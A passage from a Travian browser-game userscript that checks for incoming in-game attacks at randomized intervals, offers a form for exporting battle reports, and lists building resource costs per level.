		if( RB.attackList.length < 2 )  aDv.innerHTML = 'No attack'; else aDv.innerHTML = '';
		if( ! ver4FL && villages_count < 2 && RB.attackList.length > 1 ) {
			aDv.appendChild($ee('SPAN','Under attack!',[['style','color:red;']]));
		} else {
			for( var t=1; t<RB.attackList.length; t++ ) {
				aDv.appendChild(vLinks.snapshotItem(RB.attackList[t]).cloneNode(true));
				if(RB.attackList.length > t+1) aDv.appendChild($t(', '));
			}
		}
		aDv.appendChild($e('BR'));
		timerB[timerNum] = new Object();
		timerB[timerNum].time = Math.round(nextCheck/1000);
		timerB[timerNum].obj = $eT('SPAN', timerB[timerNum].time, 0);
		aDv.appendChild(timerB[timerNum].obj);
	}
	function showError () {
		var aDv = $g(allIDs[23]);
		if( aDv ) {
			aDv.innerHTML = "<span style='color:red;'> Error! </span>";
		}
	}
	function findAttack( nd ) {
		var aLink = fullName +'dorf1.php?'+ linkVSwitch[nd].match(/newdid=\d+/i)[0];
		ajaxRequest(aLink, 'GET', null, function(ajaxResp) {
			var ad = ajaxNDIV(ajaxResp);
			var move = $xf('.//*[@id="movements"]','f',ad);
			ad = null;
			if (move) {
				if( /att1|att3/.test(move.innerHTML) ) {
					RB.attackList.push(nd);
				}
			}
			if( nd == linkVSwitch.length-1 ) {
				setTimeout( function() { ajaxRequest(active_did, 'GET', null, dummy, dummy); }, getRandom(300,1000));
				RB.attackList[0] = new Date().getTime();
				RB_setValue(GMcookieID + 'Att', JSON.stringify(RB.attackList));
				nextCheck = getRandom(basePeriod,2e5);
				setTimeout( getAttackAInfo, nextCheck);
				FreezeScreen(false);
				showAtt();
				if( RB.attackList.length > 1 ) show_alert();
			}
		}, showError);
	}
	function FreezeScreen( state ) {
		if( RB.Setup[30] < 2 ) return;
		scroll(0,0);
		var outerPane = $g(allIDs[27]);
		if (state) {
			if (outerPane) outerPane.className = allIDs[25];
		} else {
			if (outerPane) outerPane.className = allIDs[24];
		}
	}

	try { RB.attackList = JSON.parse(RB_getValue(GMcookieID + 'Att','[0]')); } catch (err) { RB.attackList = [0]; }
	var timerNum = 0;
	if( RB.Setup[31] < 5 || RB.Setup[31] > 30 ) RB.Setup[31] = 15;
	var basePeriod = (parseInt(RB.Setup[31])-1)*6e4;
	var firstCheck = parseInt(RB.attackList[0]) + basePeriod - RunTime[0];
	var nextCheck =  firstCheck < 3e5 ? getRandom(3e5,3e4): getRandom(firstCheck,1e5);
	if( ! ver4FL && villages_count < 2 ) {
		setTimeout( getAttackAInfo31, nextCheck);
		showAtt();
	} else {
		var vLinks = $xf(vLinksPat,'l');
		var active_did = crtPath.split("?")[0] + clearAntibot( linkVSwitch[village_aNum] );
		setTimeout( getAttackAInfo, nextCheck);
		showAtt();
		var btnX = $ee('BUTTON','X');
		btnX.addEventListener("click", function(){ FreezeScreen(false) }, true);
		var divIn = $em('div',['checking ',btnX],[['class',allIDs[26]]]);
		var divF = $ee("div",divIn,[['align','center'],['id', allIDs[27]],['class',allIDs[24]]]);
		document.body.insertBefore(divF, document.body.firstChild);
	}
}

function analyzerSetup () {
	if( closeWindowN(7) ) return;

	function okAnalyzer() {
		for( var i=0; i<serversAC; i++ ) {
			RB.serversAN[i] = inp[i].value;
		}
		saveCookie('AS', 'serversAN');
		cancelAnalyzer();
	}
	function cancelAnalyzer() {
		closeWindowN(7);
	}

	var newT = $e('TABLE',[['class',allIDs[7]]]);
	var inp = [];
	for( var i=0; i<serversAC; i++ ) {
		var ps = userActivityServers(i+1)[2].split('###');
		inp[i] = $e('INPUT',[['type','text'],['value',ps[1]],['size',(ps[1].length+1)]])
		newT.appendChild($ee('TR',$em('TD',[ps[0],inp[i],ps[2]],[['style','direction:ltr;']])));
	}
	newT.appendChild($ee('TR',okTD(okAnalyzer,cancelAnalyzer)));
	var xy = offsetPosition(this);
	windowID[7] = makeFloat(newT,xy[0]-(ltr?320:20),xy[1]-190,22);
}

function timeToBids () {
	var timers = $xf('.//span[contains(@id,"timer")]','l',cont);
	for( var i=0; i<timers.snapshotLength; i++ ) {
		timers.snapshotItem(i).setAttribute('title',formatTime(absTime(toSeconds(timers.snapshotItem(i).innerHTML)),2));
	}
}

function addReport () {
	if( closeWindowN(8) ) return;
	var reportO = $g('report_surround');
	if( !(reportO) ) return;

	function cancelLog () {
		closeWindowN(8);
	}

	var report = reportO.cloneNode(true);
	var rt = $gc(allIDs[7],report)[0];
	rt.parentNode.removeChild(rt);

	var reportV = report.innerHTML.replace(/<button[\s\S]+?button>/g,'').replace(/\"\"/g,'').
		replace(/<script[\s\S]+?script>/g,'').replace(/alt=\"(.+?)\"/g,">$1<a").replace(/\s{2,}/g,' ').
		replace(/<\/th>|<\/td>/g,"\t").replace(/<\/div>|<\/tr>/g,"\n").onlyText().replace(/\n{2,}/g,'\n');
	var form = $e('FORM',[['method','post'],['action','http://travian-reports.net/convert'],['target','_blank']]);
	form.appendChild($e('input',[['type','hidden'],['name','design'],['value',(ver4FL?1:0)]]));
	form.appendChild($ee('textarea', reportV, [['name','report'],['cols',30],['rows',10]]));
	form.appendChild($em('DIV',[$e('input',[['type','checkbox'],['name','anonymous']]),"anonymous"]));
	form.appendChild($em('DIV',[$e('input',[['type','checkbox'],['name','h_a']]),"hide attaker"]));
	form.appendChild($em('DIV',[$e('input',[['type','checkbox'],['name','h_d']]),"hide defender"]));
	var newBTX = $ee('BUTTON',gtext("cancel"),[['class',allIDs[15]],['onClick',jsNone]]);
	newBTX.addEventListener('click', cancelLog, true);
	form.appendChild($em('DIV',[$e('input',[['type','submit'],['name','step1']]),newBTX]));
	var newRF = $ee('DIV',form,[['style','background-color:cyan;']]);

	var xy = offsetPosition(this);
	windowID[8] = makeFloat(newRF, xy[0]-100, xy[1]-250, 21);
}

/************************** center number ****************************/
function centerNumber () {

var dorf = 0;
var bCost = [[0],//dummy
[//lumberCost gid = 1
[0,0,0,0,0,0],
[40,100,50,60,1,2],
[65,165,85,100,1,3],
[110,280,140,165,2,4],
[185,465,235,280,2,5],
[310,780,390,465,2,6],
[520,1300,650,780,3,8],
[870,2170,1085,1300,4,10],
[1450,3625,1810,2175,4,12],
[2420,6050,3025,3630,5,14],
[4040,10105,5050,6060,6,16],//10
[6750,16870,8435,10125,7,18],
[11270,28175,14090,16905,9,20],
[18820,47055,23525,28230,11,22],
[31430,78580,39290,47150,13,24],
[52490,131230,65615,78740,15,26],
[87660,219155,109575,131490,18,29],
[146395,365985,182995,219590,22,32],
[244480,611195,305600,366715,27,35],
[408280,1020695,510350,612420,32,38],
[681825,1704565,852280,1022740,38,41],//20
[1138650,2846620,1423310,1707970,38,44],
[1901540,4753855,2376925,2852315,38,47],
[3175575,7938935,3969470,4763360,38,50],
[5303210,13258025,6629015,7954815,38,53],
[8856360,22140900,11070450,13284540,38,56]//25
],
[//clayCost gid = 2
[0,0,0,0,0,0],
[80,40,80,50,1,2],
[135,65,135,85,1,3],
[225,110,225,140,2,4],
[375,185,375,235,2,5],
[620,310,620,390,2,6],
[1040,520,1040,650,3,8],
[1735,870,1735,1085,4,10],
[2900,1450,2900,1810,4,12],
[4840,2420,4840,3025,5,14],
[8080,4040,8080,5050,6,16],//10
[13500,6750,13500,8435,7,18],
[22540,11270,22540,14090,9,20],
[37645,18820,37645,23525,11,22],
[62865,31430,62865,39290,13,24],
[104985,52490,104985,65615,15,26],
[175320,87660,175320,109575,18,29],
[292790,146395,292790,182995,22,32],
[488955,244480,488955,305600,27,35],
[816555,408280,816555,510350,32,38],
[1363650,681825,1363650,852280,38,41],//20
[2277295,1138650,2277295,1423310,38,44],
[3803085,1901540,3803085,2376925,38,47],
[6351150,3175575,6351150,3969470,38,50],
[10606420,5303210,10606420,6629015,38,53],
[17712720,8856360,17712720,11070450,38,56]//25
],
[//ironCost gid = 3
[0,0,0,0,0,0],
[100,80,30,60,1,3],
[165,135,50,100,1,5],
[280,225,85,165,2,7],
[465,375,140,280,2,9],
[780,620,235,465,2,11],
[1300,1040,390,780,3,13],
[2170,1735,650,1300,4,15],
[3625,2900,1085,2175,4,17],
[6050,4840,1815,3630,5,19],
[10105,8080,3030,6060,6,21],//10
[16870,13500,5060,10125,7,24],
[28175,22540,8455,16905,9,27],
[47055,37645,14115,28230,11,30],
[78580,62865,23575,47150,13,33],
[131230,104985,39370,78740,15,36],
[219155,175320,65745,131490,18,39],
[365985,292790,109795,219590,22,42],
[611195,488955,183360,366715,27,45],
[1020695,816555,306210,612420,32,48],
[1704565,1363650,511370,1022740,38,51],//20
[2846620,2277295,853985,1707970,38,54],
[4753855,3803085,1426155,2852315,38,57],
[7938935,6351150,2381680,4763360,38,60],
[13258025,10606420,3977410,7954815,38,63],
[22140900,17712720,6642270,13284540,38,66]//25
],
[//cropCost gid = 4
[0,0,0,0,0,0],
[70,90,70,20,1,0],
[115,150,115,35,1,0],
[195,250,195,55,2,0],
[325,420,325,95,2,0],
[545,700,545,155,2,0],
[910,1170,910,260,3,1],
[1520,1950,1520,435,4,2],
[2535,3260,2535,725,4,3],
[4235,5445,4235,1210,5,4],
[7070,9095,7070,2020,6,5],//10
[11810,15185,11810,3375,7,6],
[19725,25360,19725,5635,9,7],
[32940,42350,32940,9410,11,8],
[55005,70720,55005,15715,13,9],
[91860,118105,91860,26245,15,10],
[153405,197240,153405,43830,18,12],
[256190,329385,256190,73195,22,14],
[427835,550075,427835,122240,27,16],
[714485,918625,714485,204140,32,18],
[1193195,1534105,1193195,340915,38,20],//20
[1992635,2561960,1992635,569325,38,22],
[3327700,4278470,3327700,950770,38,24],
[5557255,7145045,5557255,1587785,38,26],
[9280620,11932225,9280620,2651605,38,28],
[15498630,19926810,15498630,4428180,38,30]//25
],
[//sawmillCost gid = 5
[0,0,0,0,0,0],
[520,380,290,90,1,4],
[935,685,520,160,1,6],
[1685,1230,940,290,2,8],
[3035,2215,1690,525,2,10],
[5460,3990,3045,945,2,12]
],
[//brickyardCost gid = 6
[0,0,0,0,0,0],
[440,480,320,50,1,3],
[790,865,575,90,1,5],
[1425,1555,1035,160,2,7],
[2565,2800,1865,290,2,9],
[4620,5040,3360,525,2,11]
],
[//ironFoundryCost gid = 7
[0,0,0,0,0,0],
[200,450,510,120,1,6],
[360,810,920,215,1,9],
[650,1460,1650,390,2,12],
[1165,2625,2975,700,2,15],
[2100,4725,5355,1260,2,18]
],
[//grainMillCost gid = 8
[0,0,0,0,0,0],
[500,440,380,1240,1,3],
[900,790,685,2230,1,5],
[1620,1425,1230,4020,2,7],
[2915,2565,2215,7230,2,9],
[5250,4620,3990,13015,2,11]
],
[//bakeryCost gid = 9
[0,0,0,0,0,0],
[1200,1480,870,1600,1,4],
[2160,2665,1565,2880,1,6],
[3890,4795,2820,5185,2,8],
[7000,8630,5075,9330,2,10],
[12595,15535,9135,16795,2,12]
],
[//warehouseCost gid = 10
[0,0,0,0,0,0],
[130,160,90,40,1,1],
[165,205,115,50,1,2],
[215,260,145,65,2,3],
[275,335,190,85,2,4],
[350,430,240,105,2,5],
[445,550,310,135,3,6],
[570,705,395,175,4,7],
[730,900,505,225,4,8],
[935,1155,650,290,5,9],
[1200,1475,830,370,6,10],//10
[1535,1890,1065,470,7,12],
[1965,2420,1360,605,9,14],
[2515,3095,1740,775,11,16],
[3220,3960,2230,990,13,18],
[4120,5070,2850,1270,15,20],
[5275,6490,3650,1625,18,22],
[6750,8310,4675,2075,22,24],
[8640,10635,5980,2660,27,26],
[11060,13610,7655,3405,32,28],
[14155,17420,9800,4355,38,30]//20
],
[//granaryCost gid = 11
[0,0,0,0,0,0],
[80,100,70,20,1,1],
[100,130,90,25,1,2],
[130,165,115,35,2,3],
[170,210,145,40,2,4],
[215,270,190,55,2,5],
[275,345,240,70,3,6],
[350,440,310,90,4,7],
[450,565,395,115,4,8],
[575,720,505,145,5,9],
[740,920,645,185,6,10],//10
[945,1180,825,235,7,12],
[1210,1510,1060,300,9,14],
[1545,1935,1355,385,11,16],
[1980,2475,1735,495,13,18],
[2535,3170,2220,635,15,20],
[3245,4055,2840,810,18,22],
[4155,5190,3635,1040,22,24],
[5315,6645,4650,1330,27,26],
[6805,8505,5955,1700,32,28],
[8710,10890,7620,2180,38,30]//20
],
[//blacksmithCost gid = 12
[0,0,0,0,0,0],
[170,200,380,130,2,4],
[220,255,485,165,3,6],
[280,330,625,215,3,8],
[355,420,795,275,4,10],
[455,535,1020,350,5,12],
[585,685,1305,445,6,15],
[750,880,1670,570,7,18],
[955,1125,2140,730,9,21],
[1225,1440,2740,935,10,24],
[1570,1845,3505,1200,12,27],//10
[2005,2360,4485,1535,15,30],
[2570,3020,5740,1965,18,33],
[3290,3870,7350,2515,21,36],
[4210,4950,9410,3220,26,39],
[5390,6340,12045,4120,31,42],
[6895,8115,15415,5275,37,46],
[8825,10385,19730,6750,44,50],
[11300,13290,25255,8640,53,54],
[14460,17015,32325,11060,64,58],
[18510,21780,41380,14155,77,62]//20
],
[//armouryCost gid = 13
[0,0,0,0,0,0],
[130,210,410,130,2,4],
[165,270,525,165,3,6],
[215,345,670,215,3,8],
[275,440,860,275,4,10],
[350,565,1100,350,5,12],
[445,720,1410,445,6,15],
[570,925,1805,570,7,18],
[730,1180,2310,730,9,21],
[935,1515,2955,935,10,24],
[1200,1935,3780,1200,12,27],//10
[1535,2480,4840,1535,15,30],
[1965,3175,6195,1965,18,33],
[2515,4060,7930,2515,21,36],
[3220,5200,10150,3220,26,39],
[4120,6655,12995,4120,31,42],
[5275,8520,16630,5275,37,46],
[6750,10905,21290,6750,44,50],
[8640,13955,27250,8640,53,54],
[11060,17865,34880,11060,64,58],
[14155,22865,44645,14155,77,62]//20
],
[//tournamentSquareCost gid = 14
[0,0,0,0,0,0],
[1750,2250,1530,240,1,1],
[2240,2880,1960,305,1,2],
[2865,3685,2505,395,2,3],
[3670,4720,3210,505,2,4],
[4700,6040,4105,645,2,5],
[6015,7730,5255,825,3,6],
[7695,9895,6730,1055,4,7],
[9850,12665,8615,1350,4,8],
[12610,16215,11025,1730,5,9],
[16140,20755,14110,2215,6,10],//10
[20660,26565,18065,2835,7,12],
[26445,34000,23120,3625,9,14],
[33850,43520,29595,4640,11,16],
[43330,55705,37880,5940,13,18],
[55460,71305,48490,7605,15,20],
[70990,91270,62065,9735,18,22],
[90865,116825,79440,12460,22,24],
[116305,149540,101685,15950,27,26],
[148875,191410,130160,20415,32,28],
[190560,245005,166600,26135,38,30]//20
],
[//mainBuildingCost gid = 15
[0,0,0,0,0,0],
[70,40,60,20,2,2],
[90,50,75,25,3,3],
[115,65,100,35,3,4],
[145,85,125,40,4,5],
[190,105,160,55,5,6],
[240,135,205,70,6,8],
[310,175,265,90,7,10],
[395,225,340,115,9,12],
[505,290,430,145,10,14],
[645,370,555,185,12,16],//10
[825,470,710,235,15,18],
[1060,605,905,300,18,20],
[1355,775,1160,385,21,22],
[1735,990,1485,495,26,24],
[2220,1270,1900,635,31,26],
[2840,1625,2435,810,37,29],
[3635,2075,3115,1040,44,32],
[4650,2660,3990,1330,53,35],
[5955,3405,5105,1700,64,38],
[7620,4355,6535,2180,77,41]//20
],
[//rallyPointCost gid = 16
[0,0,0,0,0,0],
[110,160,90,70,1,1],
[140,205,115,90,1,2],
[180,260,145,115,2,3],
[230,335,190,145,2,4],
[295,430,240,190,2,5],
[380,550,310,240,3,6],
[485,705,395,310,4,7],
[620,900,505,395,4,8],
[795,1155,650,505,5,9],
[1015,1475,830,645,6,10],//10
[1300,1890,1065,825,7,12],
[1660,2420,1360,1060,9,14],
[2130,3095,1740,1355,11,16],
[2725,3960,2230,1735,13,18],
[3485,5070,2850,2220,15,20],
[4460,6490,3650,2840,18,22],
[5710,8310,4675,3635,22,24],
[7310,10635,5980,4650,27,26],
[9360,13610,7655,5955,32,28],
[11980,17420,9800,7620,38,30]//20
],
[//marketplaceCost gid = 17
[0,0,0,0,0,0],
[80,70,120,70,4,4],
[100,90,155,90,4,6],
[130,115,195,115,5,8],
[170,145,250,145,6,10],
[215,190,320,190,7,12],
[275,240,410,240,9,15],
[350,310,530,310,11,18],
[450,395,675,395,13,21],
[575,505,865,505,15,24],
[740,645,1105,645,19,27],//10
[945,825,1415,825,22,30],
[1210,1060,1815,1060,27,33],
[1545,1355,2320,1355,32,38],
[1980,1735,2970,1735,39,41],
[2535,2220,3805,2220,46,44],
[3245,2840,4870,2840,55,48],
[4155,3635,6230,3635,67,52],
[5315,4650,7975,4650,80,56],
[6805,5955,10210,5955,96,60],
[8710,7620,13065,7620,115,64]//20
],
[//embassyCost gid = 18
[0,0,0,0,0,0],
[180,130,150,80,5,3],
[230,165,190,100,6,5],
[295,215,245,130,7,7],
[375,275,315,170,8,9],
[485,350,405,215,10,11],
[620,445,515,275,12,13],
[790,570,660,350,14,15],
[1015,730,845,450,17,17],
[1295,935,1080,575,21,19],
[1660,1200,1385,740,25,21],//10
[2125,1535,1770,945,30,24],
[2720,1965,2265,1210,36,27],
[3480,2515,2900,1545,43,30],
[4455,3220,3715,1980,51,33],
[5705,4120,4755,2535,62,36],
[7300,5275,6085,3245,74,39],
[9345,6750,7790,4155,89,42],
[11965,8640,9970,5315,106,45],
[15315,11060,12760,6805,128,48],
[19600,14155,16335,8710,153,51]//20
],
[//barracksCost gid = 19
[0,0,0,0,0,0],
[210,140,260,120,1,4],
[270,180,335,155,1,6],
[345,230,425,195,2,8],
[440,295,545,250,2,10],
[565,375,700,320,2,12],
[720,480,895,410,3,15],
[925,615,1145,530,4,18],
[1180,790,1465,675,4,21],
[1515,1010,1875,865,5,24],
[1935,1290,2400,1105,6,27],//10
[2480,1655,3070,1415,7,30],
[3175,2115,3930,1815,9,33],
[4060,2710,5030,2320,11,36],
[5200,3465,6435,2970,13,39],
[6655,4435,8240,3805,15,42],
[8520,5680,10545,4870,18,46],
[10905,7270,13500,6230,22,50],
[13955,9305,17280,7975,27,54],
[17865,11910,22120,10210,32,58],
[22865,15245,28310,13065,38,62]//20
],
[//stableCost gid = 20
[0,0,0,0,0,0],
[260,140,220,100,2,5],
[335,180,280,130,3,8],
[425,230,360,165,3,11],
[545,295,460,210,4,14],
[700,375,590,270,5,17],
[895,480,755,345,6,20],
[1145,615,970,440,7,23],
[1465,790,1240,565,9,26],
[1875,1010,1585,720,10,29],
[2400,1290,2030,920,12,32],//10
[3070,1655,2595,1180,15,36],
[3930,2115,3325,1510,18,40],
[5030,2710,4255,1935,21,44],
[6435,3465,5445,2475,26,48],
[8240,4435,6970,3170,31,52],
[10545,5680,8925,4055,37,56],
[13500,7270,11425,5190,44,60],
[17280,9305,14620,6645,53,64],
[22120,11910,18715,8505,64,68],
[28310,15245,23955,10890,77,72]//20
],
[//workshopCost gid = 21
[0,0,0,0,0,0],
[460,510,600,320,4,3],
[590,655,770,410,4,5],
[755,835,985,525,5,7],
[965,1070,1260,670,6,9],
[1235,1370,1610,860,7,11],
[1580,1750,2060,1100,9,13],
[2025,2245,2640,1405,11,15],
[2590,2870,3380,1800,13,17],
[3315,3675,4325,2305,15,19],
[4245,4705,5535,2950,19,21],//10
[5430,6020,7085,3780,22,24],
[6950,7705,9065,4835,27,27],
[8900,9865,11605,6190,32,30],
[11390,12625,14855,7925,39,33],
[14580,16165,19015,10140,46,36],
[18660,20690,24340,12980,55,39],
[23885,26480,31155,16615,67,42],
[30570,33895,39875,21270,80,45],
[39130,43385,51040,27225,96,48],
[50090,55535,65335,34845,115,51]//20
],
[//academyCost gid = 22
[0,0,0,0,0,0],
[220,160,90,40,5,4],
[280,205,115,50,6,6],
[360,260,145,65,7,8],
[460,335,190,85,8,10],
[590,430,240,105,10,12],
[755,550,310,135,12,15],
[970,705,395,175,14,18],
[1240,900,505,225,17,21],
[1585,1155,650,290,21,24],
[2030,1475,830,370,25,27],//10
[2595,1890,1065,470,30,30],
[3325,2420,1360,605,36,33],
[4255,3095,1740,775,43,36],
[5445,3960,2230,990,51,39],
[6970,5070,2850,1270,62,42],
[8925,6490,3650,1625,74,46],
[11425,8310,4675,2075,89,50],
[14620,10635,5980,2660,106,54],
[18715,13610,7655,3405,128,58],
[23955,17420,9800,4355,153,62]//20
],
[//crannyCost gid = 23
[0,0,0,0,0,0],
[40,50,30,10,1,0],
[50,65,40,15,1,0],
[65,80,50,15,2,0],
[85,105,65,20,2,0],
[105,135,80,25,2,0],
[135,170,105,35,3,1],
[175,220,130,45,4,2],
[225,280,170,55,4,3],
[290,360,215,70,5,4],
[370,460,275,90,6,5]//10
],
[//townhallCost gid = 24
[0,0,0,0,0,0],
[1250,1110,1260,600,6,4],
[1600,1420,1615,770,7,6],
[2050,1820,2065,985,9,8],
[2620,2330,2640,1260,10,10],
[3355,2980,3380,1610,12,12],
[4295,3815,4330,2060,15,15],
[5500,4880,5540,2640,18,18],
[7035,6250,7095,3380,21,21],
[9005,8000,9080,4325,26,24],
[11530,10240,11620,5535,31,27],//10
[14755,13105,14875,7085,37,30],
[18890,16775,19040,9065,45,33],
[24180,21470,24370,11605,53,36],
[30950,27480,31195,14855,64,39],
[39615,35175,39930,19015,77,42],
[50705,45025,51110,24340,92,46],
[64905,57635,65425,31155,111,50],
[83075,73770,83740,39875,133,54],
[106340,94430,107190,51040,160,58],
[136115,120870,137200,65335,192,62]//20
],
[//residenceCost gid = 25
[0,0,0,0,0,0],
[580,460,350,180,2,1],
[740,590,450,230,3,2],
[950,755,575,295,3,3],
[1215,965,735,375,4,4],
[1555,1235,940,485,5,5],
[1995,1580,1205,620,6,6],
[2550,2025,1540,790,7,7],
[3265,2590,1970,1015,9,8],
[4180,3315,2520,1295,11,9],
[5350,4245,3230,1660,12,10],//10
[6845,5430,4130,2125,15,12],
[8765,6950,5290,2720,18,14],
[11220,8900,6770,3480,21,16],
[14360,11390,8665,4455,26,18],
[18380,14580,11090,5705,31,20],
[23530,18660,14200,7300,37,22],
[30115,23885,18175,9345,44,24],
[38550,30570,23260,11965,53,26],
[49340,39130,29775,15315,64,28],
[63155,50090,38110,19600,77,30]//20
],
[//palaceCost gid = 26
[0,0,0,0,0,0],
[550,800,750,250,6,1],
[705,1025,960,320,7,2],
[900,1310,1230,410,9,3],
[1155,1680,1575,525,10,4],
[1475,2145,2015,670,12,5],
[1890,2750,2575,860,15,6],
[2420,3520,3300,1100,18,7],
[3095,4505,4220,1405,21,8],
[3965,5765,5405,1800,26,9],
[5075,7380,6920,2305,31,10],//10
[6495,9445,8855,2950,37,12],
[8310,12090,11335,3780,45,14],
[10640,15475,14505,4835,53,16],
[13615,19805,18570,6190,64,18],
[17430,25355,23770,7925,77,20],
[22310,32450,30425,10140,92,22],
[28560,41540,38940,12980,111,24],
[36555,53170,49845,16615,133,26],
[46790,68055,63805,21270,160,28],
[59890,87110,81670,27225,192,30]//20
],
[//treasuryCost gid = 27
[0,0,0,0,0,0],
[2880,2740,2580,990,7,4],
[3630,3450,3250,1245,9,6],
[4570,4350,4095,1570,10,8],
[5760,5480,5160,1980,12,10],
[7260,6905,6505,2495,15,12],
[9145,8700,8195,3145,18,15],
[11525,10965,10325,3960,21,18],
[14520,13815,13010,4990,26,21],
[18295,17405,16390,6290,31,24],
[23055,21930,20650,7925,37,27],//10
[29045,27635,26020,9985,45,30],
[36600,34820,32785,12580,53,33],
[46115,43875,41310,15850,64,36],
[58105,55280,52050,19975,77,39],
[73210,69655,65585,25165,92,42],
[92245,87760,82640,31710,111,46],
[116230,110580,104125,39955,133,50],
[146450,139330,131195,50340,160,54],
[184530,175560,165305,63430,192,58],
[232505,221205,208285,79925,230,62]//20
],
[//tradeOfficeCost gid = 28
[0,0,0,0,0,0],
[1400,1330,1200,400,4,3],
[1790,1700,1535,510,4,5],
[2295,2180,1965,655,5,7],
[2935,2790,2515,840,6,9],
[3760,3570,3220,1075,7,11],
[4810,4570,4125,1375,9,13],
[6155,5850,5280,1760,11,15],
[7880,7485,6755,2250,13,17],
[10090,9585,8645,2880,15,19],
[12915,12265,11070,3690,19,21],//10
[16530,15700,14165,4720,22,24],
[21155,20100,18135,6045,27,27],
[27080,25725,23210,7735,32,30],
[34660,32930,29710,9905,39,33],
[44370,42150,38030,12675,46,36],
[56790,53950,48680,16225,55,39],
[72690,69060,62310,20770,67,42],
[93045,88395,79755,26585,80,45],
[119100,113145,102085,34030,96,48],
[152445,144825,130670,43555,115,51]//20
],
[//greatBarrackCost gid = 29
[0,0,0,0,0,0],
[630,420,780,360,1,4],
[805,540,1000,460,1,6],
[1030,690,1280,590,2,8],
[1320,880,1635,755,2,10],
[1690,1125,2095,965,2,12],
[2165,1445,2680,1235,3,15],
[2770,1845,3430,1585,4,18],
[3545,2365,4390,2025,4,21],
[4540,3025,5620,2595,5,24],
[5810,3875,7195,3320,6,27],//10
[7440,4960,9210,4250,7,30],
[9520,6345,11785,5440,9,33],
[12185,8125,15085,6965,11,36],
[15600,10400,19310,8915,13,39],
[19965,13310,24720,11410,15,42],
[25555,17035,31640,14605,18,46],
[32710,21810,40500,18690,22,50],
[41870,27915,51840,23925,27,54],
[53595,35730,66355,30625,32,58],
[68600,45735,84935,39200,38,62]//20
],
[//greatStableCost gid = 30
[0,0,0,0,0,0],
[780,420,660,300,2,5],
[1000,540,845,385,3,8],
[1280,690,1080,490,3,11],
[1635,880,1385,630,4,14],
[2095,1125,1770,805,5,17],
[2680,1445,2270,1030,6,20],
[3430,1845,2905,1320,7,23],
[4390,2365,3715,1690,9,26],
[5620,3025,4755,2160,10,29],
[7195,3875,6085,2765,12,32],//10
[9210,4960,7790,3540,15,36],
[11785,6345,9975,4535,18,40],
[15085,8125,12765,5805,21,44],
[19310,10400,16340,7430,26,48],
[24720,13310,20915,9505,31,52],
[31640,17035,26775,12170,37,56],
[40500,21810,34270,15575,44,60],
[51840,27915,43865,19940,53,64],
[66355,35730,56145,25520,64,68],
[84935,45735,71870,32665,77,72]//20
],
[//citywallCost gid = 31
[0,0,0,0,0,0],
[70,90,170,70,1,0],
[90,115,220,90,1,0],
[115,145,280,115,2,0],
[145,190,355,145,2,0],
[190,240,455,190,2,0],
[240,310,585,240,3,1],
[310,395,750,310,4,2],
[395,505,955,395,4,3],
[505,650,1225,505,5,4],
[645,830,1570,645,6,5],//10
[825,1065,2005,825,7,6],
[1060,1360,2570,1060,9,7],
[1355,1740,3290,1355,11,8],
[1735,2230,4210,1735,13,9],
[2220,2850,5390,2220,15,10],
[2840,3650,6895,2840,18,12],
[3635,4675,8825,3635,22,14],
[4650,5980,11300,4650,27,16],
[5955,7655,14460,5955,32,18],
[7620,9800,18510,7620,38,20]//20
],
[//earthwallCost gid = 32
[0,0,0,0,0,0],
[120,200,0,80,1,0],
[155,255,0,100,1,0],
[195,330,0,130,2,0],
[250,420,0,170,2,0],
[320,535,0,215,2,0],
[410,685,0,275,3,1],
[530,880,0,350,4,2],
[675,1125,0,450,4,3],
[865,1440,0,575,5,4],
[1105,1845,0,740,6,5],//10
[1415,2360,0,945,7,6],
[1815,3020,0,1210,9,7],
[2320,3870,0,1545,11,8],
[2970,4950,0,1980,13,9],
[3805,6340,0,2535,15,10],
[4870,8115,0,3245,18,12],
[6230,10385,0,4155,22,14],
[7975,13290,0,5315,27,16],
[10210,17015,0,6805,32,18],
[13065,21780,0,8710,38,20]//20
],
[//palisadeCost gid = 33
[0,0,0,0,0,0],
[160,100,80,60,1,0],
[205,130,100,75,1,0],
[260,165,130,100,2,0],
[335,210,170,125,2,0],
[430,270,215,160,2,0],
[550,345,275,205,3,1],
[705,440,350,265,4,2],
[900,565,450,340,4,3],
[1155,720,575,430,5,4],
[1475,920,740,555,6,5],//10
[1890,1180,945,710,7,6],
[2420,1510,1210,905,9,7],
[3095,1935,1545,1160,11,8],
[3960,2475,1980,1485,13,9],
[5070,3170,2535,1900,15,10],
[6490,4055,3245,2435,18,12],
[8310,5190,4155,3115,22,14],
[10635,6645,5315,3990,27,16],
[13610,8505,6805,5105,32,18],
[17420,10890,8710,6535,38,20]//20
],
[//stonemasonCost gid = 34
[0,0,0,0,0,0],
[155,130,125,70,1,2],
[200,165,160,90,1,3],
[255,215,205,115,2,4],
[325,275,260,145,2,5],
[415,350,335,190,2,6],
[535,445,430,240,3,8],
[680,570,550,310,4,10],
[875,730,705,395,4,12],
[1115,935,900,505,5,14],
[1430,1200,1155,645,6,16],//10
[1830,1535,1475,825,7,18],
[2340,1965,1890,1060,9,20],
[3000,2515,2420,1355,11,22],
[3840,3220,3095,1735,13,24],
[4910,4120,3960,2220,15,26],
[6290,5275,5070,2840,18,29],
[8050,6750,6490,3635,22,32],
[10300,8640,8310,4650,27,35],
[13185,11060,10635,5955,32,38],
[16880,14155,13610,7620,38,41]//20
],
[//breweryCost gid = 35
[0,0,0,0,0,0],
[1460,930,1250,1740,5,6],
[2045,1300,1750,2435,6,9],
[2860,1825,2450,3410,7,12],
[4005,2550,3430,4775,8,15],
[5610,3575,4800,6685,10,18],
[7850,5000,6725,9360,12,22],
[10995,7000,9410,13100,14,26],
[15390,9805,13175,18340,17,30],
[21545,13725,18445,25680,21,34],
[30165,19215,25825,35950,25,38]//10
],
[//trapperCost gid = 36
[0,0,0,0,0,0],
[100,100,100,100,1,4],
[130,130,130,130,1,6],
[165,165,165,165,2,8],
[210,210,210,210,2,10],
[270,270,270,270,2,12],
[345,345,345,345,3,15],
[440,440,440,440,4,18],
[565,565,565,565,4,21],
[720,720,720,720,5,24],
[920,920,920,920,6,27],//10
[1180,1180,1180,1180,7,30],
[1510,1510,1510,1510,9,33],
[1935,1935,1935,1935,11,36],
[2475,2475,2475,2475,13,39],
[3170,3170,3170,3170,15,42],
[4055,4055,4055,4055,18,46],
[5190,5190,5190,5190,22,50],
[6645,6645,6645,6645,27,54],
[8505,8505,8505,8505,32,58],
[10890,10890,10890,10890,38,62]//20
],
[//herosMansionCost gid = 37
[0,0,0,0,0,0],
[700,670,700,240,1,2],
